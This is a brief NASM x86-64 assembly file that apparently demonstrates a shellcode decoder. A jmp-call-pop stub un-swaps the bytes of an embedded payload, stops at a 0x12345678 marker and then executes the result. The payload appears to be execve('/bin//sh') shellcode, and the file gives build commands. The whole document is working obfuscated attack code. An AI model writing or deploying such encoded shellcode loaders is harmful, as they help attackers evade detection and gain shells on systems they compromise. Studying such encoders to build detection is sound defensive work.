; Decoder demo - Byte swapped payload is decoded and executed
; Writeable .text section allows code to run from Nasm without need for shellcode wrapper
; Bulid with: nasm -felf64 decode.nasm -o tmp.o && ld tmp.o -o decode

global _start
section .TEXT exec write

_start:
	jmp short _marker
_decode_init:
	pop rdi
	lea rsi, [rdi + 3]
_decode:
	movsb
	sub rsi, 3
	movsb
	add rsi, 4
	mov eax, [rsi-2]
	cmp eax, 0x12345678
	jne short _decode
	jmp short _shell
		
_marker:
	call _decode_init
_shell: 
	db 0xa9, 0x31,0x26,0x48, 0x50,0x28,0xc0, 0x52,0x71,0x5a, 0xbb,0xde,0x48, 0x2f,0x48,0x2f, 0x69,0x6d,0x62, 0x2f,0x6e,0x6e, 0x68,0x23,0x73, 0x48,0x9f,0x53, 0xe7,0x2f,0x89, 0x57,0x0b,0x50, 0x89,0x1e,0x48, 0x83,0xfe,0xe6, 0x3b,0x81,0xc0, 0x05,0xd3,0x0f, 0x78,0x56,0x34,0x12
